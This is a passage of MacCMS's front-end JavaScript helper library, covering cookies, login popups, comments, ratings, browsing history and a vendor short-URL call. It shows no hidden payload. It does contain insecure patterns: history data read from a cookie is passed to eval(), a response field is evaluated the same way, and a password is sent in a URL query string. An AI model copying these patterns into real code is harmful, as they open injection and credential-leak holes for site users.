
String.prototype.replaceAll  = function(s1,s2){ return this.replace(new RegExp(s1,"gm"),s2); }
String.prototype.trim=function(){ return this.replace(/(^\s*)|(\s*$)/g, ""); }
var base64EncodeChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);function base64encode(str){var out,i,len;var c1,c2,c3;len=str.length;i=0;out="";while(i<len){c1=str.charCodeAt(i++)&0xff;if(i==len){out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt((c1&0x3)<<4);out+="==";break}c2=str.charCodeAt(i++);if(i==len){out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt(((c1&0x3)<<4)|((c2&0xF0)>>4));out+=base64EncodeChars.charAt((c2&0xF)<<2);out+="=";break}c3=str.charCodeAt(i++);out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt(((c1&0x3)<<4)|((c2&0xF0)>>4));out+=base64EncodeChars.charAt(((c2&0xF)<<2)|((c3&0xC0)>>6));out+=base64EncodeChars.charAt(c3&0x3F)}return out}function base64decode(str){var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out="";while(i<len){do{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)break;do{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do{c3=str.charCodeAt(i++)&0xff;if(c3==61)return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do{c4=str.charCodeAt(i++)&0xff;if(c4==61)return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}return out}function utf16to8(str){var out,i,len,c;out="";len=str.length;for(i=0;i<len;i++){c=str.charCodeAt(i);if((c>=0x0001)&&(c<=0x007F)){out+=str.charAt(i)}else if(c>0x07FF){out+=String.fromCharCode(0xE0|((c>>12)&0x0F));out+=String.fromCharCode(0x80|((c>>6)&0x3F));out+=String.fromCharCode(0x80|((c>>0)&0x3F))}else{out+=String.fromCharCode(0xC0|((c>>6)&0x1F));out+=String.fromCharCode(0x80|((c>>0)&0x3F))}}return out}function utf8to16(str){var out,i,len,c;var char2,char3;out="";len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out+=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out+=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out+=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break}}return out}

var MAC={
    'Url': document.URL,
    'Title': document.title,
    'UserAgent' : function(){
        var ua = navigator.userAgent;//navigator.appVersion
        return {
            'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
            'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
            'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器
            'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器
            'iPad': ua.indexOf('iPad') > -1, //是否iPad
            'trident': ua.indexOf('Trident') > -1, //IE内核
            'presto': ua.indexOf('Presto') > -1, //opera内核
            'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
            'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核
            'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",
        };
    }(),
    'Copy': function(s){
        if (window.clipboardData){ window.clipboardData.setData("Text",s); }
        else{
            if( $("#mac_flash_copy").get(0) ==undefined ){ $('<div id="mac_flash_copy"></div>'); } else {$('#mac_flash_copy').html(''); }
            $('#mac_flash_copy').html('<embed src='+maccms.path+'"images/_clipboard.swf" FlashVars="clipboard='+escape(s)+'" width="0" height="0" type="application/x-shockwave-flash"></embed>');
        }
        MAC.Pop.Msg(100,20,'复制成功',1000);
    },
    'Home': function(o,u){
        try{
            o.style.behavior='url(#default#homepage)'; o.setHomePage(u);
        }
        catch(e){
            if(window.netscape){
                try{netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");}
                catch(e){ MAC.Pop.Msg(150,40,'此操作被浏览器拒绝！请手动设置',1000); }
                var moz = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
                moz.setCharPref('browser.startup.homepage',u);
            }
        }
    },
    'Fav': function(u,s){
        try{ window.external.addFavorite(u, s);}
        catch (e){
            try{window.sidebar.addPanel(s, u, "");}catch (e){ MAC.Pop.Msg(150,40,'加入收藏出错，请使用键盘Ctrl+D进行添加',1000); }
        }
    },
    'Open': function(u,w,h){
        window.open(u,'macopen1','toolbars=0, scrollbars=0, location=0, statusbars=0,menubars=0,resizable=yes,width='+w+',height='+h+'');
    },
    'Cookie': {
        'Set': function(name,value,days){
            var exp = new Date();
            exp.setTime(exp.getTime() + days*24*60*60*1000);
            var arr=document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
            document.cookie=name+"="+encodeURIComponent(value)+";path=/;expires="+exp.toUTCString();
        },
        'Get': function(name){
            var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
            if(arr != null){ return decodeURIComponent(arr[2]); return null; }
        },
        'Del': function(name){
            var exp = new Date();
            exp.setTime(exp.getTime()-1);
            var cval = this.Get(name);
            if(cval != null){ document.cookie = name+"="+encodeURIComponent(cval)+";path=/;expires="+exp.toUTCString(); }
        }
    },
    'GoBack':function(){
        var ldghost=document.domain;
        if(document.referrer.indexOf(ldghost)>0) {
            history.back();
        }
        else{
            window.location ="//"+ldghost;
        }
    },
    'Adaptive':function(){
        if(maccms.mob_status=='1' && maccms.url != maccms.wapurl){
            if(document.domain ==maccms.url && MAC.UserAgent.mobile){
                    location.href = location.href.replace(maccms.url,maccms.wapurl);
            }
            else if(document.domain ==maccms.wapurl && !MAC.UserAgent.mobile){
                location.href = location.href.replace(maccms.wapurl,maccms.url);
            }
        }
    },
    'CheckBox':{
        'All':function(n){
            $("input[name='"+n+"']").each(function() {
                this.checked = true;
            });
        },
        'Other':function(n){
            $("input[name='"+n+"']").each(function() {
                this.checked = !this.checked;
            });
        },
        'Count':function(n){
            var res=0;
            $("input[name='"+n+"']").each(function() {
                if(this.checked){ res++; }
            });
            return res;
        },
        'Ids':function(n){
            var res=[];
            $("input[name='"+n+"']").each(function() {
                if(this.checked){ res.push(this.value); }
            });
            return res.join(",");
        }
    },
    'Ajax':function(url,type,dataType,data,sfun,efun,cfun){
        type=type||'get';
        dataType=dataType||'json';
        data=data||'';
        efun=efun||'';
        cfun=cfun||'';

        $.ajax({
            url:url,
            type:type,
            dataType:dataType,
            data:data,
            timeout: 5000,
            beforeSend:function(XHR){

            },
            error:function(XHR,textStatus,errorThrown){
                if(efun) efun(XHR,textStatus,errorThrown);
            },
            success:function(data){
                sfun(data);
            },
            complete:function(XHR, TS){
                if(cfun) cfun(XHR, TS);
            }
        })
    },
    'Qrcode':{
        'Init':function(){
            $('.mac_qrcode').attr('src', maccms.path +'/index.php/qrcode/index.html?url='+ MAC.Url);
        }
    },
    'Shorten': {
        'Init':function(){
            if($('.mac_shorten').length==0){
                return;
            }
            MAC.Shorten.Get();
        },
        'Get':function(url,call){
            url=url||location.href;
            MAC.Ajax('//api.maccms.la/shorten/index/url/'+ encodeURIComponent(url),'get','jsonp','',function(r){
                if (r.code == 1) {
                    if($('.mac_shorten').length>0) {
                        $('.mac_shorten').val(r.data.url_short);
                        $('.mac_shorten').html(r.data.url_short);
                    }
                    if(call){
                        call(r);
                    }

                }
            });
        }
    },
    'Image':{
        'Lazyload':{
            'Show': function(){
                try { $("img.lazy").lazyload(); }catch(e){};
            },
            'Box': function($id){
                $("img.lazy").lazyload({
                    container: $("#"+$id)
                });
            }
        }
    },
    'Verify': {
        'Init': function(){
            MAC.Verify.Focus();
            MAC.Verify.Click();
        },
        'Focus': function(){//验证码框焦点
            $('body').on("focus", ".mac_verify", function(){
                $(this).removeClass('mac_verify').after(MAC.Verify.Show());
                $(this).unbind();
            });
        },
        'Click': function(){//点击刷新
            $('body').on('click', 'img.mac_verify_img', function(){
                $(this).attr('src', maccms.path +'/index.php/verify/index.html?r='+Math.random());
            });
        },
        'Refresh':function(){
            $('.mac_verify_img').attr('src', maccms.path +'/index.php/verify/index.html?r='+Math.random());
        },
        'Show':function(){
            return '<img class="mac_verify_img" src="'+ maccms.path +'/index.php/verify/index.html?"  title="看不清楚? 换一张！">';
        }
    },
    'PageGo':{
        'Init':function() {
            $('.mac_page_go').click(function () {
                var that =$(this);
                var url = that.attr('data-url');
                var total = parseInt(that.attr('data-total'));
                var sp = that.attr('data-sp');
                var page= parseInt($('#page').val());

                if(page>0&&(page<=total)){
                    url=url.replace(sp + 'PAGELINK',sp + page).replace('PAGELINK',page);
                    location.href=url;
                }
                return false;
            });
        }
    },
    'Hits': {
        'Init':function() {
            if($('.mac_hits').length==0){
                return;
            }
            var $that = $(".mac_hits");

            MAC.Ajax(maccms.path + '/index.php/ajax/hits?mid='+$that.attr("data-mid")+'&id='+$that.attr("data-id")+'&type=update','get','json','',function(r){
                if (r.code == 1) {
                    $(".mac_hits").each(function(i){
                        $type = $(".mac_hits").eq(i).attr('data-type');
                        if($type != 'insert'){
                            $('.'+$type).html(eval('(r.data.' + $type + ')'));
                        }
                    });
                }
            });

        }
    },
    'Score': {
        'Init':function(){
            if($('.mac_score').length==0){
                return;
            }
            $('body').on('click', '.score_btn', function(e){
                MAC.Score.Submit();
            });

            MAC.Ajax(maccms.path+'/index.php/ajax/score?mid='+ $('.mac_score').attr('data-mid') +'&id=' +$('.mac_score').attr('data-id'),'post','json','',function(r){
                MAC.Score.View(r);
            },function(){
                $(".mac_score").html('评分加载失败');
            });

        },
        'Submit':function(){
            var $s = $('.mac_score').find("input[name='score']").val();
            MAC.Ajax(maccms.path+'/index.php/ajax/score?mid='+$('.mac_score').attr('data-mid')+'&id='+$('.mac_score').attr('data-id') + '&score='+ $s,'get','json','',function(r){
                MAC.Pop.Msg(100,20,r.msg,1000);
                if(r.code==1){
                    MAC.Score.View(r);
                }
            });
        },
        'View':function(r){
            $(".rating"+Math.floor(r.data.score)).attr('checked',true);
            $(".score_num").text(r.data.score_num);
            $(".score_all").text(r.data.score_all);
            $(".score_pjf").text(r.data.score);
        }
    },
    'Star': {
        'Init':function(){
            if($('.mac_star').length==0){
                return;
            }

            $('.mac_star').raty({
                starType: 'i',
                number: 5,
                numberMax : 5,
                half: true,
                score : function(){
                    return $(this).attr('data-score');
                },
                click: function(score, evt) {

                    MAC.Ajax(maccms.path+'/index.php/ajax/score?mid='+$('.mac_star').attr('data-mid')+'&id='+$('.mac_star').attr('data-id')+'&score='+(score*2),'get','json','',function(r){
                        if(json.status == 1){
                            $('.star_tips').html(r.data.score);
                        }else{
                            $('.star_box').attr('title', r.msg);
                        }
                    },function(){
                        $('.star_box').attr('title', '网络异常！');
                    });

                }
            });
        }
    },
    'Digg': {
        'Init':function(){
            $('body').on('click', '.digg_link', function(e){
                var $that = $(this);
                if($that.attr("data-id")){

                    MAC.Ajax(maccms.path + '/index.php/ajax/digg.html?mid='+$that.attr("data-mid")+'&id='+$that.attr("data-id")+'&type='+$that.attr("data-type"),'get','json','',function(r){
                        $that.addClass('disabled');
                        if(r.code == 1){
                            if($that.attr("data-type")=='up'){
                                $that.find('.digg_num').html(r.data.up);
                            }
                            else{
                                $that.find('.digg_num').html(r.data.down);
                            }
                        }
                        else{
                            $that.attr('title', r.msg);
                        }
                    });

                }
            });
        }
    },
    'Gbook':{
        'Login':0,
        'Verify':0,
        'Init':function(){
            $('body').on('keyup', '.gbook_content', function(e){
                MAC.Remaining($(this),200,'.gbook_remaining')
            });
            $('body').on('focus', '.gbook_content', function(e){
                if(MAC.Gbook.Login==1 && MAC.User.IsLogin!=1){
                    MAC.User.Login();
                }
            });
            $('body').on('click', '.gbook_submit', function(e){
                MAC.Gbook.Submit();
            });
        },
        'Show':function($page){
            MAC.Ajax(maccms.path+'/index.php/gbook/index?page='+$page,'post','json','',function(r){
                $(".mac_gbook_box").html(r);
            },function(){
                $(".mac_gbook_box").html('留言加载失败，请刷新...');
            });
        },
        'Submit':function(){
            if($(".gbook_content").val() == ''){
                MAC.Pop.Msg(100,20,'请输入您的留言!',1000);
                return false;
            }
            MAC.Ajax(maccms.path + '/index.php/gbook/saveData','post','json',$('.gbook_form').serialize(),function(r){
                MAC.Pop.Msg(100,20,r.msg,1000);
                if(r.code == 1){
                    location.reload();
                }
                else{
                    if(MAC.Gbook.Verify==1){
                        MAC.Verify.Refresh();
                    }
                }
            });
        },
        'Report':function(name,id){
            MAC.Pop.Show(400,300,'数据报错',maccms.path+'/index.php/gbook/report.html?id='+id+'&name='+ encodeURIComponent(name),function(r){

            });
        }
    },
    'Search':{
        'Init':function(){
            $('.mac_search').click(function(){
                var that=$(this);
                var url = that.attr('data-href') ? that.attr('data-href') : maccms.path + '/index.php/vod/search.html';
                location.href = url + '?wd='+ encodeURIComponent($("#wd").val());
            });
        },
        'Submit':function(){

            return false;
        }
    },
    'Suggest':{
        'Init':function($obj,$mid,$jumpurl){
            try {
                $($obj).autocomplete(maccms.path + '/index.php/ajax/suggest?mid=' + $mid, {
                    inputClass: "mac_input",
                    resultsClass: "mac_results",
                    loadingClass: "mac_loading",
                    width: 175, scrollHeight: 300, minChars: 1, matchSubset: 0,
                    cacheLength: 10, multiple: false, matchContains: true, autoFill: false,
                    dataType: "json",
                    parse: function (r) {
                        if (r.code == 1) {
                            var parsed = [];
                            $.each(r['list'], function (index, row) {
                                row.url = r.url;
                                parsed[index] = {
                                    data: row
                                };
                            });
                            return parsed;
                        } else {
                            return {data: ''};
                        }
                    },
                    formatItem: function (row, i, max) {
                        return row.name;
                    },
                    formatResult: function (row, i, max) {
                        return row.text;
                    }
                }).result(function (event, data, formatted) {
                    $($obj).val(data.name);
                    location.href = data.url.replace('mac_wd', encodeURIComponent(data.name));
                });
            }
            catch(e){}
        }
    },
    'History': {
        'BoxShow':0,
        'Limit':10,
        'Days':7,
        'Json':'',
        'Init':function(){
            if($('.mac_history').length ==0){
                return;
            }

            $('.mac_history').hover(function(e){
                $('.mac_history_box').show();
            }, function(){
                $('.mac_history_box').hover(function(){
                    MAC.History.BoxShow=1;
                }, function(){
                    MAC.History.BoxShow=0;
                    $('.mac_history_box').hide();
                });
            });

            var jsondata = [];
            if(this.Json){
                jsondata = this.Json;
            }else{
                var jsonstr = MAC.Cookie.Get('mac_history');
                if(jsonstr != undefined){
                    jsondata = eval(jsonstr);
                }
            }

            html = '<dl class="mac_drop_box mac_history_box" style="display:none;">';
            html +='<dt><a target="_self" href="javascript:void(0)" onclick="MAC.History.Clear();">清空</a></dt>';

            if(jsondata.length > 0){
                for($i=0; $i<jsondata.length; $i++){
                    if($i%2==1){
                        html +='<dd class="odd">';
                    }else{
                        html +='<dd class="even">';
                    }
                    html +='<a href="'+jsondata[$i].link+'" class="hx_title">'+jsondata[$i].name+'</a></dd>';
                }
            }else{
                html +='<dd class="hide">暂无浏览记录</dd>';
            }
            html += '</dl>';

            $('.mac_history').after(html);
            var h = $('.mac_history').height();
            var position = $('.mac_history').position();
            $('.mac_history_box').css({'left':position.left,'top':(position.top+h)});


            if($(".mac_history_set").attr('data-name')){
                var $that = $(".mac_history_set");
                MAC.History.Set($that.attr('data-name'),$that.attr('data-link'),$that.attr('data-pic'));
            }
        },
        'Set':function(name,link,pic){
            if(!link){ link = document.URL; }
            var jsondata = MAC.Cookie.Get('mac_history');

            if(jsondata != undefined){
                this.Json = eval(jsondata);

                for($i=0;$i<this.Json.length;$i++){
                    if(this.Json[$i].link == link){
                        return false;
                    }
                }

                jsonstr = '{log:[{"name":"'+name+'","link":"'+link+'","pic":"'+pic+'"},';
                for($i=0; $i<this.Json.length; $i++){
                    if($i<= this.Limit && this.Json[$i]){
                        jsonstr += '{"name":"'+this.Json[$i].name+'","link":"'+this.Json[$i].link+'","pic":"'+this.Json[$i].pic+'"},';
                    }else{
                        break;
                    }
                }
                jsonstr = jsonstr.substring(0,jsonstr.lastIndexOf(','));
                jsonstr += "]}";
            }else{
                jsonstr = '{log:[{"name":"'+name+'","link":"'+link+'","pic":"'+pic+'"}]}';
            }
            this.Json = eval(jsonstr);
            MAC.Cookie.Set('mac_history',jsonstr,this.Days);
        },
        'Clear': function(){
            MAC.Cookie.Del('mac_history');
            $('.mac_history_box').html('<li class="hx_clear">已清空观看记录。</li>');
        },
    },
    'Ulog':{
        'Init':function(){
            MAC.Ulog.Set();
            MAC.Ulog.Click();

        },
        'Get':function(mid,id,type,page,limit,call){
            MAC.Ajax(maccms.path+'/index.php/user/ajax_ulog/?ac=list&mid='+mid+'&id='+id+'&type='+type+'&page='+page+'&limit='+limit,'get','json','',call);
        },
        'Set':function(){
            if($(".mac_ulog_set").attr('data-mid')){
                var $that = $(".mac_ulog_set");
                $.get(maccms.path+'/index.php/user/ajax_ulog/?ac=set&mid='+$that.attr("data-mid")+'&id='+$that.attr("data-id")+'&sid='+$that.attr("data-sid")+'&nid='+$that.attr("data-nid")+'&type='+$that.attr("data-type"));
            }
        },
        'Click':function(){
            $('body').on('click', 'a.mac_ulog', function(e){

                //是否需要验证登录
                if(MAC.User.IsLogin == 0){
                    MAC.User.Login();
                    return;
                }

                var $that = $(this);
                if($that.attr("data-id")){
                    MAC.Ajax(maccms.path+'/index.php/user/ajax_ulog/?ac=set&mid='+$that.attr("data-mid")+'&id='+$that.attr("data-id")+'&type='+$that.attr("data-type"),'get','json','',function(r){
                        MAC.Pop.Msg(100,20,r.msg,1000);
                        if(r.code == 1){
                            $that.addClass('disabled');
                        }else{
                            $that.attr('title', r.msg);
                        }
                    });
                }
            });
        }
    },
    'Website':{
        'Referer':function() {
            if($('.mac_referer').length==0){
                return;
            }

            var url = document.referrer
                ,domain=''
                ,host = window.location.host
                ,reg = /^http(s)?:\/\/(.*?)\//i
                ,mc = url.match(reg);

            if(url=='' || url.indexOf(host)!=-1 || mc ==null){
                return;
            }
            domain = mc[2];
            MAC.Ajax(maccms.path + '/index.php/ajax/referer?domain='+encodeURIComponent(domain)+'&url='+encodeURIComponent(url)+'&type=update','get','json','',function(r){
                if (r.code == 1) {
                }
                console.log(r);
            });
        }
    },
    'User':{
        'BoxShow':0,
        'IsLogin':0,
        'UserId':'',
        'UserName':'',
        'GroupId':'',
        'GroupName':'',
        'Portrait':'',
        'Init':function(){
            if($('.mac_user').length >0){
                $('body').on('click', '.mac_user', function(e){
                    MAC.User.Login();
                });

                $('.mac_user').hover(function(e){
                    $('.mac_user_box').show();
                }, function(){
                    $('.mac_user_box').hover(function(){
                        MAC.User.BoxShow = 1;
                    }, function(){
                        MAC.User.BoxShow = 0;
                        $('.mac_user_box').hide();
                    });
                });
            }

            if(MAC.Cookie.Get('user_id') !=undefined && MAC.Cookie.Get('user_id')!=''){
                var url = maccms.path + '/index.php/user';
                MAC.User.UserId = MAC.Cookie.Get('user_id');
                MAC.User.UserName = MAC.Cookie.Get('user_name');
                MAC.User.GroupId = MAC.Cookie.Get('group_id');
                MAC.User.GroupName = MAC.Cookie.Get('group_name');
                MAC.User.Portrait = MAC.Cookie.Get('user_portrait');
                MAC.User.IsLogin = 1;

                if($('.mac_user').length >0) {
                    if ($('.mac_user').prop("outerHTML").substr(0, 2) == '<a') {
                        $('.mac_user').attr('href', url);
                        $('.mac_user').text(MAC.User.UserName);
                    }
                    else {
                        //$('.mac_user').html('<a class="mac_text" href="'+ url +'">'+ name +'</a>');
                    }

                    var html = '<div class="mac_drop_box mac_user_box" style="display: none;">';
                    html += '<ul class="logged"><li><a target="_blank" href="' + url + '">用户中心</a></li><li class="logout"><a class="logoutbt" href="javascript:;" onclick="MAC.User.Logout();" target="_self"><i class="user-logout"></i>退出</a></li></ul>'

                    $('.mac_user').after(html);
                    var h = $('.mac_user').height();
                    var position = $('.mac_user').position();
                    $('.mac_user_box').css({'left': position.left, 'top': (position.top + h)});
                }

            }
            else{

            }

        },
        'CheckLogin':function(){
            if(MAC.User.IsLogin == 0){
                MAC.User.Login();
            }
        },
        'Login':function(){
            var ac='ajax_login';
            if(MAC.Cookie.Get('user_id') !=undefined && MAC.Cookie.Get('user_id')!=''){
                ac= 'ajax_info';
            }
            MAC.Pop.Show(400,380,'用户登录',maccms.path+'/index.php/user/'+ac,function(r){
                $('body').off('click', '.login_form_submit');
                $('body').on('click', '.login_form_submit', function(e){
                    $(this).unbind('click');

                    MAC.Ajax(maccms.path + '/index.php/user/login','post','json',$('.mac_login_form').serialize(),function(r){
                        alert(r.msg);
                        if(r.code == 1){
                            location.reload();
                        }
                    });
                });
            });
        },
        'Logout':function(){
            MAC.Ajax(maccms.path + '/index.php/user/logout','post','json','',function(r){
                MAC.Pop.Msg(100,20,r.msg,1000);
                if(r.code == 1){
                    location.reload();
                }
            });
        },
        'PopedomCallBack':function(trysee,h) {
            window.setTimeout(function(){
                $(window.frames["player_if"].document).find(".MacPlayer").html(h);
            },1000*10*trysee);
        },
        'BuyPopedom':function(o){
            var $that = $(o);
            if($that.attr("data-id")){
                if (confirm('您确认购买此条数据访问权限吗？')) {
                    MAC.Ajax(maccms.path + '/index.php/user/ajax_buy_popedom.html?id=' + $that.attr("data-id") + '&mid=' + $that.attr("data-mid") + '&sid=' + $that.attr("data-sid") + '&nid=' + $that.attr("data-nid") + '&type=' + $that.attr("data-type"),'get','json','',function(r){
                        $that.addClass('disabled');
                        MAC.Pop.Msg(300, 50, r.msg, 2000);
                        if (r.code == 1) {
                            top.location.reload();
                        }
                        $that.removeClass('disabled');
                    });
                }
            }
        }
    },
    'Pop':{
        'Remove':function(){
            $('.mac_pop_bg').remove();
            $('.mac_pop').remove();
        },
        'RemoveMsg':function(){
            $('.mac_pop_msg_bg').remove();
            $('.mac_pop_msg').remove();
        },
        'Msg':function($w,$h,$msg,$timeout){
            if($('.mac_pop_bg').length !=1) {
                MAC.Pop.Remove();
            }
            $('body').append('<div class="mac_pop_msg_bg"></div><div class="mac_pop_msg"><div class="pop-msg"></div></div>');
            $('.mac_pop_msg .pop_close').click(function(){
                $('.mac_pop_msg').remove();
            });

            $('.mac_pop_msg').width($w);
            $('.mac_pop_msg').height($h);
            $('.mac_pop_msg .pop-msg').html($msg);
            $('.mac_pop_msg_bg,.mac_pop_msg').show();
            setTimeout(MAC.Pop.RemoveMsg,$timeout);
        },
        'Show':function($w,$h,$title,$url,$callback) {
            if($('.mac_pop_bg').length !=1) {
                MAC.Pop.Remove();
            }

            $('body').append('<div class="mac_pop_bg"></div><div class="mac_pop"><div class="pop_top"><h2></h2><span class="pop_close">Ｘ</span></div><div class="pop_content"></div></div>');
            $('.mac_pop .pop_close').click(function(){
                $('.mac_pop_bg,.mac_pop').remove();
            });

            $('.mac_pop').width($w);
            $('.mac_pop').height($h);
            $('.pop_content').html('');
            $('.pop_top').find('h2').html($title);

            MAC.Ajax($url,'post','json','',function(r){
                $(".pop_content").html(r);
                $callback(r);
            },function(){
                $(".pop_content").html('加载失败，请刷新...');
            });

            $('.mac_pop_bg,.mac_pop').show();
        }
    },
    'Pwd':{
        'Check':function(o){
            var $that = $(o);
            if($that.attr("data-id")){
                    MAC.Ajax(maccms.path + '/index.php/ajax/pwd.html?id=' + $that.attr("data-id") + '&mid=' + $that.attr("data-mid") + '&type=' + $that.attr("data-type") + '&pwd='+ $that.parents('form').find('input[name="pwd"]').val() ,'get','json','',function(r){
                        $that.addClass('disabled');
                        MAC.Pop.Msg(300, 50, r.msg, 2000);
                        if (r.code == 1) {
                            location.reload();
                        }
                        $that.removeClass('disabled');
                    });

            }
        }
    },
    'AdsWrap':function(w,h,n){
        document.writeln('<img width="'+w+'" height="'+h+'" alt="'+n+'" style="background-color: #CCCCCC" />');
    },
    'Css':function($url){
        $("<link>").attr({ rel: "stylesheet",type: "text/css",href: $url}).appendTo("head");
    },
    'Js':function($url){
        $.getScript($url, function(response, status) {

        });
    },
    'Desktop':function(s){
        location.href= maccms.path + '/index.php/ajax/desktop?name='+encodeURI(s)+'&url=' + encodeURI(location.href);
    },
    'Timming':function(){
        if($('.mac_timming').length==0){
            return;
        }
        var infile = $('.mac_timming').attr("data-file");
        if(infile==undefined || infile == ''){
            infile = 'api.php';
        }
        var t=(new Image());t.src=maccms.path + '/'+infile+'/timming/index?t='+Math.random();
    },
    'Error':function(tab,id,name){

    },
    'AddEm':function(obj,i){
        var oldtext = $(obj).val();
        $(obj).val( oldtext + '[em:' + i +']' );
    },
    'Remaining':function(obj,len,show){
        var count = len - $(obj).val().length;
        if(count < 0){
            count = 0;
            $(obj).val($(obj).val().substr(0,200));
        }
        $(show).text(count);
    },
    'Comment':{
        'Login':0,
        'Verify':0,
        'Init':function(){

            $('body').on('click', '.comment_face_box img', function(e){
                var obj = $(this).parent().parent().parent().find('.comment_content');
                MAC.AddEm(obj,$(this).attr('data-id'));
            });
            $('body').on('click', '.comment_face_panel', function(e){
                // $('.comment_face_box').toggle();
                $(this).parent().find('.comment_face_box').toggle();
            });
            $('body').on('keyup', '.comment_content', function(e){
                var obj = $(this).parent().parent().parent().parent().find('.comment_remaining');
                MAC.Remaining($(this),200,obj)
            });
            $('body').on('focus', '.comment_content', function(e){
                if(MAC.Comment.Login==1 && MAC.User.IsLogin!=1){
                    MAC.User.Login();
                }
            });

            $('body').on('click', '.comment_report', function(e){
                var $that = $(this);
                if($(this).attr("data-id")){
                    MAC.Ajax(maccms.path + '/index.php/comment/report.html?id='+$that.attr("data-id"),'get','json','',function(r){
                        $that.addClass('disabled');
                        MAC.Pop.Msg(100,20,r.msg,1000);
                        if(r.code == 1){
                        }
                    });
                }
            });

            $('body').on('click', '.comment_reply', function(e){
                var $that = $(this);
                if($that.attr("data-id")){
                    var str = $that.html();
                    $('.comment_reply_form').remove();
                    if (str == '取消回复') {
                        $that.html('回复');
                        return false;
                    }
                    if (str == '回复') {
                        $('.comment_reply').html('回复');
                    }
                    var html = $('.comment_form').prop("outerHTML");

                    var oo = $(html);
                    oo.addClass('comment_reply_form');
                    oo.find('input[name="comment_pid"]').val( $that.attr("data-id") );

                    $that.parent().after(oo);
                    $that.html('取消回复');
                }
            });

            $('body').on('click', '.comment_submit', function(e){
                var $that = $(this);
                MAC.Comment.Submit($that);
            });

        },
        'Show':function($page){
            if($(".mac_comment").length>0){
                MAC.Ajax(maccms.path + '/index.php/comment/ajax.html?rid='+$('.mac_comment').attr('data-id')+'&mid='+ $('.mac_comment').attr('data-mid') +'&page='+$page,'get','json','',function(r){
                    $(".mac_comment").html(r);
                },function(){
                    $(".mac_comment").html('<a href="javascript:void(0)" onclick="MAC.Comment.Show('+$page+')">评论加载失败，点击我刷新...</a>');
                });
            }
        },
        'Reply':function($o){

        },
        'Submit':function($o){
            var form = $o.parents('form');
            if($(form).find(".comment_content").val() == ''){
                MAC.Pop.Msg(100,20,'请输入您的评论！',1000);
                return false;
            }
            if($('.mac_comment').attr('data-mid') == ''){
                MAC.Pop.Msg(100,20,'模块mid错误！',1000);
                return false;
            }
            if($('.mac_comment').attr('data-id') == ''){
                MAC.Pop.Msg(100,20,'关联id错误！',1000);
                return false;
            }
            MAC.Ajax(maccms.path + '/index.php/comment/saveData','post','json',$(form).serialize() + '&comment_mid='+ $('.mac_comment').attr('data-mid') + '&comment_rid=' + $('.mac_comment').attr('data-id'),function(r){
                MAC.Pop.Msg(100,20,r.msg,1000);
                if(r.code == 1){
                    MAC.Comment.Show(1);
                }
                else{
                    if(MAC.Comment.Verify==1){
                        MAC.Verify.Refresh();
                    }
                }
            });
        }
    }
}

$(function(){
    //异步加载图片初始化
    MAC.Image.Lazyload.Show();
    //自动跳转手机和pc网页地址
    MAC.Adaptive();
    //验证码初始化
    MAC.Verify.Init();
    //分页跳转初始化
    MAC.PageGo.Init();
    //用户部分初始化
    MAC.User.Init();
    //二维码初始化
    MAC.Qrcode.Init();
    //顶和踩初始化
    MAC.Digg.Init();
    //评分初始化
    MAC.Score.Init();
    //星星评分初始化
    MAC.Star.Init();
    //点击数量
    MAC.Hits.Init();
    //短网址
    MAC.Shorten.Init();
    //历史记录初始化
    MAC.History.Init();
    //用户访问记录初始化
    MAC.Ulog.Init();
    //联想搜索初始化
    MAC.Suggest.Init('.mac_wd',1,'');
    //网址导航来路统计
    MAC.Website.Referer();
    //定时任务初始化
    MAC.Timming();
